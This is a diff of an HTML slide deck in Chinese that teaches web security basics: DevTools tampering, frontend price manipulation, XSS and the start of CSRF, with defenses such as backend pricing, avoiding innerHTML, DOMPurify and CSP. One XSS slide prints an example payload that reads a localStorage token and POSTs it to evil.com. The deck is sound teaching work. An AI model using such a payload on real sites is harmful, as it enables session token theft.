-                            <div style="flex: 1; background: rgba(52,199,89,0.1); padding: 0.6rem; border-radius: 6px; border: 2px solid #34c759; text-align: center;">
-                                <div style="font-size: 1.2rem; margin-bottom: 0.2rem;">🎉</div>
-                                <p style="font-size: 0.65rem; font-weight: 600; color: #34c759;">攻擊成功<br>$1 買到商品！</p>
-                            </div>
-                        </div>
+        <section>
+          <div class="content-wrapper">
+            <h2 style="font-size: 2.2rem; margin-bottom: 0.8rem; color: var(--primary-blue)">DevTool 是什麼？</h2>
 
-                        <!-- 解決方案 -->
-                        <div style="background: rgba(52,199,89,0.1); padding: 0.9rem; border-radius: var(--radius-medium); border-left: 4px solid #34c759;">
-                            <h3 style="color: #34c759; font-size: 0.95rem; margin-bottom: 0.4rem;">✅ 正確做法</h3>
-                            <p style="font-size: 0.75rem; line-height: 1.4; margin-bottom: 0.3rem;">
-                                • <strong>前端只傳：</strong>產品 ID + 數量
-                            </p>
-                            <p style="font-size: 0.75rem; line-height: 1.4; margin-bottom: 0.3rem;">
-                                • <strong>後端計算：</strong>查詢資料庫取得正確價格
-                            </p>
-                            <p style="font-size: 0.75rem; line-height: 1.4;">
-                                • <strong>永遠驗證：</strong>所有金額計算都在後端完成
-                            </p>
-                        </div>
-                    </div>
+            <p style="font-size: 1.1rem; margin-bottom: 1.2rem; color: var(--text-secondary)">任何人都能打開</p>
+
+            <div style="max-width: 800px; margin: 0 auto">
+              <!-- 如何開啟 -->
+
+              <div style="background: rgba(0, 122, 255, 0.1); padding: 1.5rem; border-radius: var(--radius-medium); margin-bottom: 1.2rem; border: 2px solid rgba(0, 122, 255, 0.3)">
+                <h3 style="color: var(--primary-blue); font-size: 1.3rem; margin-bottom: 0.8rem; text-align: center">🔧 如何開啟</h3>
+
+                <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 1rem; text-align: center">
+                  <div>
+                    <div style="font-size: 2.5rem; margin-bottom: 0.3rem">⌨️</div>
+
+                    <p style="font-size: 0.9rem; font-weight: 600">按 F12</p>
+                  </div>
+
+                  <div>
+                    <div style="font-size: 2.5rem; margin-bottom: 0.3rem">🖱️</div>
+
+                    <p style="font-size: 0.9rem; font-weight: 600">右鍵 → 檢查</p>
+                  </div>
+
+                  <div>
+                    <div style="font-size: 2.5rem; margin-bottom: 0.3rem">⌘</div>
+
+                    <p style="font-size: 0.9rem; font-weight: 600">Mac: Cmd+Option+I</p>
+                  </div>
                 </div>
-            </section>
+              </div>
 
-            <!-- Slide 7：XSS — 一句話與比喻 -->
-            <section>
-                <div class="content-wrapper">
-                    <h2 style="font-size: 2.4rem; margin-bottom: 1.5rem; color: var(--primary-blue);">XSS — Cross-Site Scripting</h2>
-                    <div style="max-width: 750px; margin: 0 auto;">
-                        <div style="background: rgba(255,59,48,0.1); padding: 2rem; border-radius: var(--radius-large); margin-bottom: 1.5rem; border: 2px solid rgba(255,59,48,0.3);">
-                            <h3 style="color: #ff3b30; font-size: 1.6rem; margin-bottom: 1.5rem;">🦠 具體場景</h3>
-                            <p style="font-size: 1.25rem; line-height: 1.7; font-weight: 600;">
-                                你在購物網站的評論區<br>
-                                看到「限時優惠」按鈕就點了<br>
-                                → 帳號被盜、錢被轉走
-                            </p>
-                        </div>
-                        <div style="background: var(--background-tertiary); padding: 1.8rem; border-radius: var(--radius-large);">
-                            <h3 style="font-size: 1.4rem; color: var(--primary-blue); margin-bottom: 1rem;">📮 就像</h3>
-                            <p style="font-size: 1.2rem; line-height: 1.7;">
-                                社區佈告欄上有人貼了<br>
-                                「掃 QR Code 領紅包」的假傳單<br>
-                                一掃就中毒
-                            </p>
-                        </div>
-                    </div>
+              <!-- 關鍵訊息 -->
+
+              <div style="background: rgba(255, 59, 48, 0.1); padding: 1.5rem; border-radius: var(--radius-medium); border: 2px solid rgba(255, 59, 48, 0.3)">
+                <h3 style="color: #ff3b30; font-size: 1.3rem; margin-bottom: 0.8rem; text-align: center">⚠️ 關鍵重點</h3>
+
+                <p style="font-size: 1.1rem; line-height: 1.6; text-align: center; font-weight: 600">
+                  你看得到的畫面，攻擊者也看得到<br />
+
+                  <span style="color: #ff3b30">甚至能改！</span>
+                </p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Slide 4：DevTool 實戰演示 -->
+
+        <section>
+          <div class="content-wrapper">
+            <h2 style="font-size: 2.2rem; margin-bottom: 0.8rem; color: var(--primary-blue)">DevTool 實戰演示</h2>
+
+            <p style="font-size: 1rem; margin-bottom: 1.2rem; color: var(--text-secondary)">三個任何人都能做的「攻擊」</p>
+
+            <div style="max-width: 800px; margin: 0 auto">
+              <div style="display: flex; flex-direction: column; gap: 1rem">
+                <!-- 場景 1 -->
+
+                <div style="background: rgba(255, 59, 48, 0.1); padding: 1.2rem; border-radius: var(--radius-medium); border-left: 4px solid #ff3b30">
+                  <h3 style="color: #ff3b30; font-size: 1.2rem; margin-bottom: 0.6rem">💰 場景 1: 改價格</h3>
+
+                  <p style="font-size: 0.95rem; line-height: 1.5">
+                    Elements → 找到價格欄位 → Edit as HTML → 改成 $1<br />
+
+                    <span style="color: #666">→ 畫面上的 $1,999 變成 $1（但後端不會接受）</span>
+                  </p>
                 </div>
-            </section>
 
-            <!-- Slide 7：XSS — 原理與示例（視覺化 + 互動範例） -->
-            <section>
-                <div class="content-wrapper">
-                    <h2 style="font-size: 1.7rem; margin-bottom: 0.6rem; color: var(--primary-blue);">XSS 原理與示例</h2>
-                    <div style="max-width: 850px; margin: 0 auto;">
-                        <!-- 視覺化流程 -->
-                        <div style="display: flex; align-items: center; justify-content: space-between; gap: 0.5rem; margin-bottom: 0.6rem;">
-                            <div style="flex: 1; background: rgba(255,149,0,0.1); padding: 0.5rem; border-radius: 6px; border: 2px solid #ff9500; text-align: center;">
-                                <div style="font-size: 1.2rem; margin-bottom: 0.2rem;">👤</div>
-                                <p style="font-size: 0.65rem; font-weight: 600; color: #ff9500;">攻擊者<br>輸入惡意腳本</p>
-                                <code style="display: block; margin-top: 0.2rem; font-size: 0.55rem; background: rgba(0,0,0,0.1); padding: 0.15rem; border-radius: 4px;">&lt;script&gt;...</code>
-                            </div>
-                            <div style="font-size: 1.2rem; color: #ff9500;">→</div>
-                            <div style="flex: 1; background: rgba(175,82,222,0.1); padding: 0.5rem; border-radius: 6px; border: 2px solid #af52de; text-align: center;">
-                                <div style="font-size: 1.2rem; margin-bottom: 0.2rem;">💻</div>
-                                <p style="font-size: 0.65rem; font-weight: 600; color: #af52de;">網站<br>直接輸出</p>
-                                <code style="display: block; margin-top: 0.2rem; font-size: 0.55rem; background: rgba(0,0,0,0.1); padding: 0.15rem; border-radius: 4px;">innerHTML</code>
-                            </div>
-                            <div style="font-size: 1.2rem; color: #ff3b30;">→</div>
-                            <div style="flex: 1; background: rgba(255,59,48,0.1); padding: 0.5rem; border-radius: 6px; border: 2px solid #ff3b30; text-align: center;">
-                                <div style="font-size: 1.2rem; margin-bottom: 0.2rem;">😱</div>
-                                <p style="font-size: 0.65rem; font-weight: 600; color: #ff3b30;">其他使用者<br>腳本執行</p>
-                                <div style="margin-top: 0.2rem; font-size: 0.55rem;">Token 被竊取</div>
-                            </div>
-                        </div>
+                <!-- 場景 2 -->
 
-                        <!-- 互動範例：左右對比 -->
-                        <div style="display: flex; gap: 0.6rem; margin-bottom: 0.6rem;">
-                            <!-- 左側：渲染後的留言板 -->
-                            <div style="flex: 1; background: white; border: 2px solid var(--border-color); border-radius: 6px; padding: 0.7rem;">
-                                <h3 style="font-size: 0.8rem; margin-bottom: 0.4rem; color: #333; text-align: left;">💬 使用者看到的畫面</h3>
-                                <div style="background: #f5f5f5; padding: 0.4rem; border-radius: 4px; margin-bottom: 0.4rem; text-align: left;">
-                                    <p style="font-size: 1rem; color: #666; margin-bottom: 0.15rem;">👤 使用者 A</p>
-                                    <p style="font-size: 1.3rem; color: #333;">這個產品很不錯！</p>
-                                </div>
-                                <div style="background: rgba(255,59,48,0.05); padding: 0.4rem; border-radius: 4px; border: 1px dashed #ff3b30; text-align: left;">
-                                    <p style="font-size: 1rem; color: #666; margin-bottom: 0.15rem;">👤 攻擊者</p>
-                                    <p style="font-size: 1.3rem; color: #333; margin-bottom: 0.3rem;">看看這個優惠！</p>
-                                    <button
-                                        onclick="alert(`${localStorage.getItem('token')} \n\n ⚠️ XSS 攻擊演示！\n\n如果這是真的惡意腳本：\n• 可以讀取 localStorage token\n• 可以發送到攻擊者伺服器\n• 可以以你的身分執行操作`)"
-                                        style="padding: 0.25rem 0.5rem; background: linear-gradient(135deg, #ff3b30 0%, #ff6b6b 100%); color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 0.6rem;">
-                                        🎁 點擊領取優惠
-                                    </button>
-                                </div>
-                            </div>
+                <div style="background: rgba(255, 149, 0, 0.1); padding: 1.2rem; border-radius: var(--radius-medium); border-left: 4px solid #ff9500">
+                  <h3 style="color: #ff9500; font-size: 1.2rem; margin-bottom: 0.6rem">🔓 場景 2: 挖出隱藏功能</h3>
 
-                            <!-- 右側：原始代碼 -->
-                            <div style="flex: 1; background: rgba(0,0,0,0.85); border: 2px solid #ff3b30; border-radius: 6px; padding: 0.7rem;">
-                                <h3 style="font-size: 0.8rem; margin-bottom: 0.4rem; color: #ff9500; text-align: left;">⚠️ 攻擊者輸入的原始代碼</h3>
-                                <pre style="font-size: 1rem; color: #34c759; line-height: 1.3; margin: 0; text-align: left; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code>看看這個優惠！
+                  <p style="font-size: 0.95rem; line-height: 1.5">
+                    Elements → 搜尋 "hidden" → 刪除 display:none<br />
+
+                    <span style="color: #666">→ 原本隱藏的「管理員按鈕」出現了</span>
+                  </p>
+                </div>
+
+                <!-- 場景 3 -->
+
+                <div style="background: rgba(175, 82, 222, 0.1); padding: 1.2rem; border-radius: var(--radius-medium); border-left: 4px solid #af52de">
+                  <h3 style="color: #af52de; font-size: 1.2rem; margin-bottom: 0.6rem">🎫 場景 3: 看到 Token</h3>
+
+                  <p style="font-size: 0.95rem; line-height: 1.5">
+                    Application → Cookies → 找到 "token"<br />
+
+                    <span style="color: #666">→ 如果沒設定 HttpOnly，Token 就可以被看光光</span>
+                  </p>
+                </div>
+              </div>
+
+              <!-- 總結 -->
+
+              <div style="background: rgba(52, 199, 89, 0.1); padding: 1.2rem; border-radius: var(--radius-medium); border: 2px solid rgba(52, 199, 89, 0.3); margin-top: 1.2rem">
+                <p style="font-size: 1.1rem; font-weight: 600; color: #34c759; text-align: center">💡 這就是為什麼「前端不可信」</p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Slide 5：前端不可信核心概念 -->
+
+        <section>
+          <div class="content-wrapper">
+            <h2 style="font-size: 2.4rem; margin-bottom: 1.5rem; color: var(--primary-blue)">為什麼「前端不可信」？</h2>
+
+            <div style="max-width: 700px; margin: 0 auto">
+              <div style="background: rgba(255, 149, 0, 0.1); padding: 2rem; border-radius: var(--radius-large); margin-bottom: 1.5rem; border: 2px solid rgba(255, 149, 0, 0.4)">
+                <p style="font-size: 1.2rem; line-height: 1.6; margin-bottom: 1rem">前端執行在<span style="color: #ff9500; font-weight: 700">使用者端</span></p>
+
+                <p style="font-size: 1.2rem; line-height: 1.6; margin-bottom: 1rem">→ 使用者可修改 DOM / JS</p>
+
+                <p style="font-size: 1.2rem; line-height: 1.6">→ 可傳輸任意數值給後端</p>
+              </div>
+
+              <div style="background: var(--background-tertiary); padding: 1.8rem; border-radius: var(--radius-large)">
+                <h3 style="font-size: 1.4rem; color: var(--primary-blue); margin-bottom: 1rem">核心口訣</h3>
+
+                <p style="font-size: 1.2rem; line-height: 1.6; font-weight: 600">
+                  前端只負責 UI 展示<br />
+
+                  後端才擁有功能存取的最終決定權
+                </p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Slide 6：前端不可信互動演示 -->
+
+        <section>
+          <div class="content-wrapper">
+            <h2 style="font-size: 1.9rem; margin-bottom: 0.7rem; color: var(--primary-blue)">前端不可信演示</h2>
+
+            <div style="max-width: 850px; margin: 0 auto">
+              <!-- 商品卡片 + 互動輸入 -->
+
+              <div style="background: white; border: 2px solid var(--border-color); border-radius: var(--radius-large); padding: 1rem; margin-bottom: 0.7rem">
+                <div style="display: flex; gap: 1rem; align-items: center">
+                  <div style="width: 80px; height: 80px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: var(--radius-medium)"></div>
+
+                  <div style="flex: 1; text-align: left">
+                    <h3 style="font-size: 1.1rem; margin-bottom: 0.4rem; color: #333">精美產品</h3>
+
+                    <div style="display: flex; align-items: center; gap: 0.6rem; margin-bottom: 0.5rem">
+                      <span style="font-size: 0.9rem; color: #666">原價：</span>
+
+                      <span style="font-size: 1.5rem; font-weight: 700; color: #333" id="originalPrice">$1,999</span>
+                    </div>
+
+                    <div style="display: flex; align-items: center; gap: 0.6rem; margin-bottom: 0.5rem">
+                      <label style="font-size: 0.9rem; color: #666">修改價格：</label>
+
+                      <input type="number" id="hackPrice" value="1" style="padding: 0.3rem 0.6rem; border: 2px solid #ff3b30; border-radius: 6px; font-size: 0.9rem; width: 80px" placeholder="輸入價格" />
+                    </div>
+
+                    <button id="addToCartBtn" style="padding: 0.4rem 1rem; background: var(--primary-blue); color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 0.9rem; font-weight: 600">加入購物車</button>
+                  </div>
+                </div>
+              </div>
+
+              <!-- 攻擊流程圖 -->
+
+              <div style="display: flex; align-items: center; justify-content: space-between; gap: 0.5rem; margin-bottom: 0.7rem">
+                <div style="flex: 1; background: rgba(255, 59, 48, 0.1); padding: 0.6rem; border-radius: 6px; border: 2px solid #ff3b30; text-align: center">
+                  <div style="font-size: 1.2rem; margin-bottom: 0.2rem">😈</div>
+
+                  <p style="font-size: 0.65rem; font-weight: 600; color: #ff3b30">前端竄改<br />price: $1</p>
+                </div>
+
+                <div style="font-size: 1.2rem; color: #ff3b30">→</div>
+
+                <div style="flex: 1; background: rgba(175, 82, 222, 0.1); padding: 0.6rem; border-radius: 6px; border: 2px solid #af52de; text-align: center">
+                  <div style="font-size: 1.2rem; margin-bottom: 0.2rem">📡</div>
+
+                  <p style="font-size: 0.65rem; font-weight: 600; color: #af52de">發送請求<br />POST /cart</p>
+                </div>
+
+                <div style="font-size: 1.2rem; color: #ff3b30">→</div>
+
+                <div style="flex: 1; background: rgba(255, 149, 0, 0.1); padding: 0.6rem; border-radius: 6px; border: 2px solid #ff9500; text-align: center">
+                  <div style="font-size: 1.2rem; margin-bottom: 0.2rem">💾</div>
+
+                  <p style="font-size: 0.65rem; font-weight: 600; color: #ff9500">後端直接接受<br />建立購物車</p>
+                </div>
+
+                <div style="font-size: 1.2rem; color: #34c759">→</div>
+
+                <div style="flex: 1; background: rgba(52, 199, 89, 0.1); padding: 0.6rem; border-radius: 6px; border: 2px solid #34c759; text-align: center">
+                  <div style="font-size: 1.2rem; margin-bottom: 0.2rem">🎉</div>
+
+                  <p style="font-size: 0.65rem; font-weight: 600; color: #34c759">攻擊成功<br />$1 買到商品！</p>
+                </div>
+              </div>
+
+              <!-- 解決方案 -->
+
+              <div style="background: rgba(52, 199, 89, 0.1); padding: 0.9rem; border-radius: var(--radius-medium); border-left: 4px solid #34c759">
+                <h3 style="color: #34c759; font-size: 0.95rem; margin-bottom: 0.4rem">✅ 正確做法</h3>
+
+                <p style="font-size: 0.75rem; line-height: 1.4; margin-bottom: 0.3rem">• <strong>前端只傳：</strong>產品 ID + 數量</p>
+
+                <p style="font-size: 0.75rem; line-height: 1.4; margin-bottom: 0.3rem">• <strong>後端計算：</strong>查詢資料庫取得正確價格</p>
+
+                <p style="font-size: 0.75rem; line-height: 1.4">• <strong>永遠驗證：</strong>所有金額計算都在後端完成</p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Slide 7：XSS — 一句話與比喻 -->
+
+        <section>
+          <div class="content-wrapper">
+            <h2 style="font-size: 2.4rem; margin-bottom: 1.5rem; color: var(--primary-blue)">XSS — Cross-Site Scripting</h2>
+
+            <div style="max-width: 750px; margin: 0 auto">
+              <div style="background: rgba(255, 59, 48, 0.1); padding: 2rem; border-radius: var(--radius-large); margin-bottom: 1.5rem; border: 2px solid rgba(255, 59, 48, 0.3)">
+                <h3 style="color: #ff3b30; font-size: 1.6rem; margin-bottom: 1.5rem">🦠 具體場景</h3>
+
+                <p style="font-size: 1.25rem; line-height: 1.7; font-weight: 600">
+                  你在購物網站的評論區<br />
+
+                  看到「限時優惠」按鈕就點了<br />
+
+                  → 帳號被盜、錢被轉走
+                </p>
+              </div>
+
+              <div style="background: var(--background-tertiary); padding: 1.8rem; border-radius: var(--radius-large)">
+                <h3 style="font-size: 1.4rem; color: var(--primary-blue); margin-bottom: 1rem">📮 就像</h3>
+
+                <p style="font-size: 1.2rem; line-height: 1.7">
+                  社區佈告欄上有人貼了<br />
+
+                  「掃 QR Code 領紅包」的假傳單<br />
+
+                  一掃就中毒
+                </p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Slide 7：XSS — 原理與示例（視覺化 + 互動範例） -->
+
+        <section>
+          <div class="content-wrapper">
+            <h2 style="font-size: 1.7rem; margin-bottom: 0.6rem; color: var(--primary-blue)">XSS 原理與示例</h2>
+
+            <div style="max-width: 850px; margin: 0 auto">
+              <!-- 視覺化流程 -->
+
+              <div style="display: flex; align-items: center; justify-content: space-between; gap: 0.5rem; margin-bottom: 0.6rem">
+                <div style="flex: 1; background: rgba(255, 149, 0, 0.1); padding: 0.5rem; border-radius: 6px; border: 2px solid #ff9500; text-align: center">
+                  <div style="font-size: 1.2rem; margin-bottom: 0.2rem">👤</div>
+
+                  <p style="font-size: 0.65rem; font-weight: 600; color: #ff9500">攻擊者<br />輸入惡意腳本</p>
+
+                  <code style="display: block; margin-top: 0.2rem; font-size: 0.55rem; background: rgba(0, 0, 0, 0.1); padding: 0.15rem; border-radius: 4px">&lt;script&gt;...</code>
+                </div>
+
+                <div style="font-size: 1.2rem; color: #ff9500">→</div>
+
+                <div style="flex: 1; background: rgba(175, 82, 222, 0.1); padding: 0.5rem; border-radius: 6px; border: 2px solid #af52de; text-align: center">
+                  <div style="font-size: 1.2rem; margin-bottom: 0.2rem">💻</div>
+
+                  <p style="font-size: 0.65rem; font-weight: 600; color: #af52de">網站<br />直接輸出</p>
+
+                  <code style="display: block; margin-top: 0.2rem; font-size: 0.55rem; background: rgba(0, 0, 0, 0.1); padding: 0.15rem; border-radius: 4px">innerHTML</code>
+                </div>
+
+                <div style="font-size: 1.2rem; color: #ff3b30">→</div>
+
+                <div style="flex: 1; background: rgba(255, 59, 48, 0.1); padding: 0.5rem; border-radius: 6px; border: 2px solid #ff3b30; text-align: center">
+                  <div style="font-size: 1.2rem; margin-bottom: 0.2rem">😱</div>
+
+                  <p style="font-size: 0.65rem; font-weight: 600; color: #ff3b30">其他使用者<br />腳本執行</p>
+
+                  <div style="margin-top: 0.2rem; font-size: 0.55rem">Token 被竊取</div>
+                </div>
+              </div>
+
+              <!-- 互動範例：左右對比 -->
+
+              <div style="display: flex; gap: 0.6rem; margin-bottom: 0.6rem">
+                <!-- 左側：渲染後的留言板 -->
+
+                <div style="flex: 1; background: white; border: 2px solid var(--border-color); border-radius: 6px; padding: 0.7rem">
+                  <h3 style="font-size: 0.8rem; margin-bottom: 0.4rem; color: #333; text-align: left">💬 使用者看到的畫面</h3>
+
+                  <div style="background: #f5f5f5; padding: 0.4rem; border-radius: 4px; margin-bottom: 0.4rem; text-align: left">
+                    <p style="font-size: 1rem; color: #666; margin-bottom: 0.15rem">👤 使用者 A</p>
+
+                    <p style="font-size: 1.3rem; color: #333">這個產品很不錯！</p>
+                  </div>
+
+                  <div style="background: rgba(255, 59, 48, 0.05); padding: 0.4rem; border-radius: 4px; border: 1px dashed #ff3b30; text-align: left">
+                    <p style="font-size: 1rem; color: #666; margin-bottom: 0.15rem">👤 攻擊者</p>
+
+                    <p style="font-size: 1.3rem; color: #333; margin-bottom: 0.3rem">看看這個優惠！</p>
+
+                    <button onclick="alert(`${localStorage.getItem('token')} \n\n ⚠️ XSS 攻擊演示！\n\n如果這是真的惡意腳本：\n• 可以讀取 localStorage token\n• 可以發送到攻擊者伺服器\n• 可以以你的身分執行操作`)" style="padding: 0.25rem 0.5rem; background: linear-gradient(135deg, #ff3b30 0%, #ff6b6b 100%); color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 0.6rem">🎁 點擊領取優惠</button>
+                  </div>
+                </div>
+
+                <!-- 右側：原始代碼 -->
+
+                <div style="flex: 1; background: rgba(0, 0, 0, 0.85); border: 2px solid #ff3b30; border-radius: 6px; padding: 0.7rem">
+                  <h3 style="font-size: 0.8rem; margin-bottom: 0.4rem; color: #ff9500; text-align: left">⚠️ 攻擊者輸入的原始代碼</h3>
+
+                  <pre style="font-size: 1rem; color: #34c759; line-height: 1.3; margin: 0; text-align: left; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word"><code>看看這個優惠！
+
 &lt;button onclick="
+
   const token =
+
     localStorage.getItem('token');
+
   fetch('https://evil.com/steal', {
+
     method: 'POST',
+
     body: JSON.stringify({token})
+
   });
+
 "&gt;
+
   🎁 點擊領取優惠
+
 &lt;/button&gt;</code></pre>
-                            </div>
-                        </div>
-
-                        <!-- 說明 -->
-                        <div style="background: rgba(255,149,0,0.1); padding: 0.6rem; border-radius: 6px; border-left: 3px solid #ff9500;">
-                            <p style="font-size: 1rem; line-height: 1.25; color: #333; text-align: left;">
-                                💡 <strong>演示說明</strong>：左側是使用者看到的畫面（已渲染），右側是攻擊者輸入的原始 HTML 代碼。當網站使用 innerHTML 直接輸出時，惡意腳本就會執行。
-                            </p>
-                        </div>
-                    </div>
                 </div>
-            </section>
+              </div>
 
-            <!-- Slide 8：XSS — 檢測與修法 -->
-            <section>
-                <div class="content-wrapper">
-                    <h2 style="font-size: 2.2rem; margin-bottom: 1.2rem; color: var(--primary-blue);">XSS 檢測與防護</h2>
-                    <div style="max-width: 720px; margin: 0 auto;">
-                        <div style="background: rgba(52,199,89,0.1); padding: 1.5rem; border-radius: var(--radius-medium); margin-bottom: 1.2rem; border-left: 4px solid #34c759;">
-                            <h3 style="color: #34c759; font-size: 1.3rem; margin-bottom: 0.8rem;">🔍 檢測方法</h3>
-                            <p style="font-size: 1rem; line-height: 1.5;">貼 HTML 看前端是否解析</p>
-                        </div>
-                        <div style="background: rgba(0,122,255,0.1); padding: 1.5rem; border-radius: var(--radius-medium); border-left: 4px solid var(--primary-blue);">
-                            <h3 style="color: var(--primary-blue); font-size: 1.3rem; margin-bottom: 0.8rem;">🛡️ 修法</h3>
-                            <p style="font-size: 0.95rem; line-height: 1.5; margin-bottom: 0.6rem;">1. 避免 innerHTML（最簡單）</p>
-                            <p style="font-size: 0.95rem; line-height: 1.5; margin-bottom: 0.6rem;">2. 使用 sanitizer（DOMPurify）</p>
-                            <p style="font-size: 0.95rem; line-height: 1.5;">3. 部署 CSP（Content Security Policy）</p>
-                        </div>
-                    </div>
+              <!-- 說明 -->
+
+              <div style="background: rgba(255, 149, 0, 0.1); padding: 0.6rem; border-radius: 6px; border-left: 3px solid #ff9500">
+                <p style="font-size: 1rem; line-height: 1.25; color: #333; text-align: left">💡 <strong>演示說明</strong>：左側是使用者看到的畫面（已渲染），右側是攻擊者輸入的原始 HTML 代碼。當網站使用 innerHTML 直接輸出時，惡意腳本就會執行。</p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Slide 8：XSS — 檢測與修法 -->
+
+        <section>
+          <div class="content-wrapper">
+            <h2 style="font-size: 2.2rem; margin-bottom: 1.2rem; color: var(--primary-blue)">XSS 檢測與防護</h2>
+
+            <div style="max-width: 720px; margin: 0 auto">
+              <div style="background: rgba(52, 199, 89, 0.1); padding: 1.5rem; border-radius: var(--radius-medium); margin-bottom: 1.2rem; border-left: 4px solid #34c759">
+                <h3 style="color: #34c759; font-size: 1.3rem; margin-bottom: 0.8rem">🔍 檢測方法</h3>
+
+                <p style="font-size: 1rem; line-height: 1.5">貼 HTML 看前端是否解析</p>
+              </div>
+
+              <div style="background: rgba(0, 122, 255, 0.1); padding: 1.5rem; border-radius: var(--radius-medium); border-left: 4px solid var(--primary-blue)">
+                <h3 style="color: var(--primary-blue); font-size: 1.3rem; margin-bottom: 0.8rem">🛡️ 修法</h3>
+
+                <p style="font-size: 0.95rem; line-height: 1.5; margin-bottom: 0.6rem">1. 避免 innerHTML（最簡單）</p>
+
+                <p style="font-size: 0.95rem; line-height: 1.5; margin-bottom: 0.6rem">2. 使用 sanitizer（DOMPurify）</p>
+
+                <p style="font-size: 0.95rem; line-height: 1.5">3. 部署 CSP（Content Security Policy）</p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- 待補充：Slide 9-21 -->
+
+        <!-- Slide 9：CSRF — 一句話與比喻 -->
+
+        <section>
+          <div class="content-wrapper">
+            <h2 style="font-size: 2.4rem; margin-bottom: 1.5rem; color: var(--primary-blue)">CSRF — Cross-Site Request Forgery</h2>
+
+            <div style="max-width: 750px; margin: 0 auto">
+              <div style="background: rgba(255, 59, 48, 0.1); padding: 2rem; border-radius: var(--radius-large); margin-bottom: 1.5rem; border: 2px solid rgba(255, 59, 48, 0.3)">
+                <h3 style="color: #ff3b30; font-size: 1.6rem; margin-bottom: 1.5rem">🎭 具體場景</h3>
+
+                <p style="font-size: 1.25rem; line-height: 1.7; font-weight: 600">
+                  你登入網路銀行後<br />
+
+                  又開了另一個分頁逛網站<br />
+
+                  → 那個網站偷偷幫你轉帳
+                </p>
+              </div>
+
+              <div style="background: var(--background-tertiary); padding: 1.8rem; border-radius: var(--radius-large)">
+                <h3 style="font-size: 1.4rem; color: var(--primary-blue); margin-bottom: 1rem">📄 就像</h3>
+
+                <p style="font-size: 1.2rem; line-height: 1.7">
+                  你帶著公司識別證進了大樓<br />
+
+                  有人趁你不注意拿你的證<br />
+
+                  去刷門禁、領東西<br />
+
+                  警衛以為是你本人
+                </p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Slide 10：CSRF — 原理與互動演示 -->
+
+        <section>
+          <div class="content-wrapper">
+            <h2 style="font-size: 1.9rem; margin-bottom: 0.7rem; color: var(--primary-blue)">CSRF 原理與演示</h2>
+
+            <div style="max-width: 950px; margin: 0 auto">
+              <!-- 視覺化流程 -->
+
+              <div style="display: flex; align-items: center; justify-content: space-between; gap: 0.5rem; margin-bottom: 0.7rem">
+                <div style="flex: 1; background: rgba(52, 199, 89, 0.1); padding: 0.6rem; border-radius: 6px; border: 2px solid #34c759; text-align: center">
+                  <div style="font-size: 1.4rem; margin-bottom: 0.3rem">👤</div>
+
+                  <p style="font-size: 0.75rem; font-weight: 600; color: #34c759">使用者<br />登入 A 網站</p>
+
+                  <div style="margin-top: 0.3rem; font-size: 0.65rem; background: rgba(0, 0, 0, 0.1); padding: 0.2rem; border-radius: 4px">🍪 Cookie</div>
                 </div>
-            </section>
 
-            <!-- 待補充：Slide 9-21 -->
+                <div style="font-size: 1.3rem; color: #ff9500">→</div>
 
-            <!-- Slide 9：CSRF — 一句話與比喻 -->
-            <section>
-                <div class="content-wrapper">
-                    <h2 style="font-size: 2.4rem; margin-bottom: 1.5rem; color: var(--primary-blue);">CSRF — Cross-Site Request Forgery</h2>
-                    <div style="max-width: 750px; margin: 0 auto;">
-                        <div style="background: rgba(255,59,48,0.1); padding: 2rem; border-radius: var(--radius-large); margin-bottom: 1.5rem; border: 2px solid rgba(255,59,48,0.3);">
-                            <h3 style="color: #ff3b30; font-size: 1.6rem; margin-bottom: 1.5rem;">🎭 具體場景</h3>
-                            <p style="font-size: 1.25rem; line-height: 1.7; font-weight: 600;">
-                                你登入網路銀行後<br>
-                                又開了另一個分頁逛網站<br>
-                                → 那個網站偷偷幫你轉帳
-                            </p>
-                        </div>
-                        <div style="background: var(--background-tertiary); padding: 1.8rem; border-radius: var(--radius-large);">
-                            <h3 style="font-size: 1.4rem; color: var(--primary-blue); margin-bottom: 1rem;">📄 就像</h3>
-                            <p style="font-size: 1.2rem; line-height: 1.7;">
-                                你帶著公司識別證進了大樓<br>
-                                有人趁你不注意拿你的證<br>
-                                去刷門禁、領東西<br>
-                                警衛以為是你本人
-                            </p>
-                        </div>
-                    </div>
+                <div style="flex: 1; background: rgba(255, 59, 48, 0.1); padding: 0.6rem; border-radius: 6px; border: 2px solid #ff3b30; text-align: center">
+                  <div style="font-size: 1.4rem; margin-bottom: 0.3rem">😈</div>
+
+                  <p style="font-size: 0.75rem; font-weight: 600; color: #ff3b30">惡意 B 網站<br />偷發請求</p>
+
+                  <code style="display: block; margin-top: 0.3rem; font-size: 0.6rem; background: rgba(0, 0, 0, 0.1); padding: 0.2rem; border-radius: 4px">GET /api/user</code>
                 </div>
-            </section>
 
-            <!-- Slide 10：CSRF — 原理與互動演示 -->
-            <section>
-                <div class="content-wrapper">
-                    <h2 style="font-size: 1.9rem; margin-bottom: 0.7rem; color: var(--primary-blue);">CSRF 原理與演示</h2>
-                    <div style="max-width: 950px; margin: 0 auto;">
-                        <!-- 視覺化流程 -->
-                        <div style="display: flex; align-items: center; justify-content: space-between; gap: 0.5rem; margin-bottom: 0.7rem;">
-                            <div style="flex: 1; background: rgba(52,199,89,0.1); padding: 0.6rem; border-radius: 6px; border: 2px solid #34c759; text-align: center;">
-                                <div style="font-size: 1.4rem; margin-bottom: 0.3rem;">👤</div>
-                                <p style="font-size: 0.75rem; font-weight: 600; color: #34c759;">使用者<br>登入 A 網站</p>
-                                <div style="margin-top: 0.3rem; font-size: 0.65rem; background: rgba(0,0,0,0.1); padding: 0.2rem; border-radius: 4px;">🍪 Cookie</div>
-                            </div>
